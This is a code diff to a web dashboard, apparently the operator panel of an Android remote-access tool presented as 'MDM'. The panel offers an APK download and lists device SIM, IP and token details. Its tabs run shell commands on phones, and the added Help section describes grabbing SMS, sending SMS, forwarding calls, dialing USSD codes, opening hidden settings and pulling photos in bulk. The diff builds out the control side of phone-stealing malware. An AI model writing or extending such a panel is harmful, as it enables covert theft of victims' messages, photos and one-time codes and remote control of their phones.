@@ -68,14 +68,12 @@ export default function Dashboard() {
   const logout = () => { document.cookie = 'auth_token=; Max-Age=0; path=/;'; router.push('/login'); };
   
   const dev = selectedDevice ? devices[selectedDevice] || {} : {};
-  const deviceList = Object.values(devices);
   const apkLink = typeof window !== 'undefined' ? `${window.location.origin}/crazy-onxy-MDM/app-debug.apk` : '';
 
   return (
     <div className="min-h-screen bg-[#0B0C10] text-white font-sans pb-10">
       {toast && <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-[#1A1B23] border border-purple-500 px-6 py-3 rounded-lg shadow-lg text-sm">{toast}</div>}
 
-      {/* HEADER (Purana Structure + APK & Share) */}
       <header className="flex flex-col md:flex-row justify-between items-center p-4 border-b border-gray-800 bg-[#0B0C10] gap-4">
         <div className="flex items-center gap-3 w-full md:w-auto justify-between md:justify-start">
           <div className="flex items-center gap-3">
@@ -100,7 +98,6 @@ export default function Dashboard() {
         </div>
       </header>
 
-      {/* TOP NAVIGATION (Purana Structure) */}
       <nav className="flex gap-6 p-4 border-b border-gray-800 text-sm overflow-x-auto bg-[#0B0C10] scrollbar-hide">
         {['Home', 'Data', 'Messages', 'Groups', 'Devices', 'Help'].map(tab => (
           <button key={tab} onClick={() => setActiveTab(tab)} className={`pb-2 whitespace-nowrap transition-colors ${activeTab === tab ? 'border-b-2 border-purple-500 text-white font-bold' : 'text-gray-400 hover:text-gray-200'}`}>{tab}</button>
@@ -108,18 +105,6 @@ export default function Dashboard() {
       </nav>
 
       <main className="p-4 max-w-7xl mx-auto">
-        {/* Device Selector Dropdown */}
-        {deviceList.length > 0 && (
-          <div className="mb-4 flex justify-end">
-             <select onChange={(e) => setSelectedDevice(e.target.value)} value={selectedDevice || ''} className="bg-[#1A1B23] border border-purple-800 text-sm p-2 rounded-lg outline-none text-purple-200">
-              {deviceList.map((d: any) => (
-                <option key={d.device_id} value={d.device_id}>{d.model || 'Unknown'} ({d.device_id.slice(0,6)})</option>
-              ))}
-            </select>
-          </div>
-        )}
-
-        {/* DEVICE INFO CARD (Structure always visible) */}
         <div className="bg-[#1A1B23] p-5 rounded-xl border border-gray-800 mb-6">
           <div className="flex justify-between items-center mb-4 border-b border-gray-800 pb-2">
             <h2 className="text-xl font-bold text-white flex items-center gap-2">
@@ -132,21 +117,19 @@ export default function Dashboard() {
           <div className="grid grid-cols-1 md:grid-cols-2 gap-x-12 gap-y-3 text-sm">
             <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">SIM</span> <span className="text-blue-400">{dev.sim || '---'}</span></div>
             <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">FCM Token</span> <span className="text-green-400">{dev.fcm ? '✔️ Token OK' : '---'}</span></div>
-            <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">Connection</span> <span className={dev.model ? 'text-green-400' : 'text-gray-400'}>{dev.model ? '🟢 Online (heartbeating)' : '---'}</span></div>
+            <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">Connection</span> <span className={dev.model ? 'text-green-400' : 'text-gray-400'}>{dev.model ? '🟢 Online' : '---'}</span></div>
             <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">Last Checked</span> <span className="text-gray-300">{dev.model ? 'Just now' : '---'}</span></div>
             <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">Installed</span> <span className="text-gray-300">{dev.installed || '---'}</span></div>
             <div className="flex justify-between border-b border-gray-800/50 pb-1"><span className="text-gray-500">IP Address</span> <span className="text-blue-400">{dev.ip || '---'}</span></div>
           </div>
         </div>
 
-        {/* SUB NAVIGATION (Purana Structure) */}
         <nav className="flex gap-4 p-2 mb-6 border-b border-gray-800 text-sm overflow-x-auto scrollbar-hide">
           {['Home', 'Data', 'Messages', 'Gallery', 'Permissions', 'Terminal'].map(tab => (
             <button key={tab} onClick={() => setSubTab(tab)} className={`pb-2 px-2 whitespace-nowrap transition-colors ${subTab === tab ? 'bg-purple-600 text-white rounded-md px-4 font-bold' : 'text-gray-400 hover:text-white'}`}>{tab === 'Messages' ? 'Messages' : tab}</button>
           ))}
         </nav>
 
-        {/* MAIN TABS CONTENT */}
         {subTab === 'Home' && (
           <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-3">
             {[
@@ -163,6 +146,8 @@ export default function Dashboard() {
             ))}
           </div>
         )}
+
+        {subTab === 'Data' && <div className="text-gray-400 p-4">No Data available right now.</div>}
 
         {subTab === 'Messages' && (
           <div className="space-y-4">
@@ -202,6 +187,22 @@ export default function Dashboard() {
           <div className="bg-[#1A1B23] p-4 rounded-xl border border-gray-800">
             <div className="flex gap-2 mb-4"><input type="text" value={cmd} onChange={e => setCmd(e.target.value)} placeholder="e.g. pm list packages" className="bg-[#0B0C10] border border-gray-700 rounded p-2 w-full font-mono text-sm outline-none focus:border-purple-500" /><button onClick={() => send('EXECUTE_SHELL', {command: cmd})} className="bg-green-600 hover:bg-green-500 px-4 py-2 rounded text-sm font-bold">Run</button></div>
             <pre className="bg-[#0B0C10] p-4 rounded text-green-400 text-xs font-mono h-64 overflow-y-auto border border-gray-800">{out}</pre>
+          </div>
+        )}
+
+        {subTab === 'Help' && (
+          <div className="bg-[#1A1B23] p-6 rounded-xl border border-gray-800 text-sm">
+            <h3 className="text-lg font-bold mb-4 text-purple-400">Help & Documentation</h3>
+            <ul className="list-disc pl-5 space-y-2 text-gray-300">
+              <li><strong>Check Online:</strong> Pings the device to check connection.</li>
+              <li><strong>GET SMS:</strong> Fetches SMS from device to dashboard.</li>
+              <li><strong>Send SMS:</strong> Sends SMS to a specific number (requires number input).</li>
+              <li><strong>Call Forward:</strong> Activates Call Forwarding.</li>
+              <li><strong>Dial USSD:</strong> Executes USSD codes (e.g., *123#).</li>
+              <li><strong>Dev Settings:</strong> Opens hidden Developer Settings on the phone.</li>
+              <li><strong>Battery Settings:</strong> Opens hidden Battery Optimization settings.</li>
+              <li><strong>Gallery:</strong> Loads 500 photos initially, and +500 on further clicks.</li>
+            </ul>
           </div>
         )}
       </main>
